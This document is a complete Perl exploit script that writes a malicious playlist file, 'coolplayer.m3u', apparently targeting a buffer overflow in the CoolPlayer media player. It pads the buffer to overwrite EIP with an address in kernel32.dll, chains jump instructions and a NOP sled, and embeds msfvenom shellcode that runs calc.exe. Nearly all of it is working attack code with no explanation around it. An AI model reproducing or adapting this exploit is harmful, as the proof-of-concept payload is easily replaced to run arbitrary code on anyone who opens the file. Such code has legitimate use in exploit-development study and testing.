#!/usr/bin/perl

my $buffsize = 10000;					                                                #set consistent buffer size

my $jmp = "\x83\xc3\x64" x 3;			                                            	#ADD EBX,300 ; x3
$jmp = $jmp . "\xff\xe3";				                                                #JMP EBX

my $junk = "\x41" x (260 - length($jmp));		                                        #offset to EIP
my $eip = pack('V', 0x7c8103d5);		                                            	#call ebx from kernel32.dll

my $nops = "\x90" x 50;

#msfvenom -p windows/exec CMD=calc.exe -b "x00" -f perl EXITFUNC=seh
my $shellcode = 
"\xb8\xcb\x86\xcf\xfe\xdb\xdc\xd9\x74\x24\xf4\x5f\x31\xc9" .
"\xb1\x30\x31\x47\x13\x03\x47\x13\x83\xef\x37\x64\x3a\x02" .
"\x2f\xeb\xc5\xfb\xaf\x8c\x4c\x1e\x9e\x8c\x2b\x6a\xb0\x3c" .
"\x3f\x3e\x3c\xb6\x6d\xab\xb7\xba\xb9\xdc\x70\x70\x9c\xd3" .
"\x81\x29\xdc\x72\x01\x30\x31\x55\x38\xfb\x44\x94\x7d\xe6" .
"\xa5\xc4\xd6\x6c\x1b\xf9\x53\x38\xa0\x72\x2f\xac\xa0\x67" .
"\xe7\xcf\x81\x39\x7c\x96\x01\xbb\x51\xa2\x0b\xa3\xb6\x8f" .
"\xc2\x58\x0c\x7b\xd5\x88\x5d\x84\x7a\xf5\x52\x77\x82\x31" .
"\x54\x68\xf1\x4b\xa7\x15\x02\x88\xda\xc1\x87\x0b\x7c\x81" .
"\x30\xf0\x7d\x46\xa6\x73\x71\x23\xac\xdc\x95\xb2\x61\x57" .
"\xa1\x3f\x84\xb8\x20\x7b\xa3\x1c\x69\xdf\xca\x05\xd7\x8e" .
"\xf3\x56\xb8\x6f\x56\x1c\x54\x7b\xeb\x7f\x32\x7a\x79\xfa" .
"\x70\x7c\x81\x05\x24\x15\xb0\x8e\xab\x62\x4d\x45\x88\x93" .
"\xbc\x54\x04\x03\x67\x0d\x65\x49\x98\xfb\xa9\x74\x1b\x0e" .
"\x51\x83\x03\x7b\x54\xcf\x83\x97\x24\x40\x66\x98\x9b\x61" .
"\xa3\xfb\x7a\xf2\x2f\xfc";

 

my $sploit = $jmp.$junk.$eip.$nops.$shellcode;		                                    #exploit portion of buffe
my $fill = "\x43" x ($buffsize - (length($sploit)));                                	#fill remainder of buffer
my $buffer = $sploit.$fill;			                                                	#build final buffer

#write the exploit buffer to file
my $file = "coolplayer.m3u";
open(FILE, ">$file");
print FILE $buffer;
close(FILE);
print "Exploit file [" . $file . "] created\n";
print "Buffer size: " . length($buffer) . "\n";
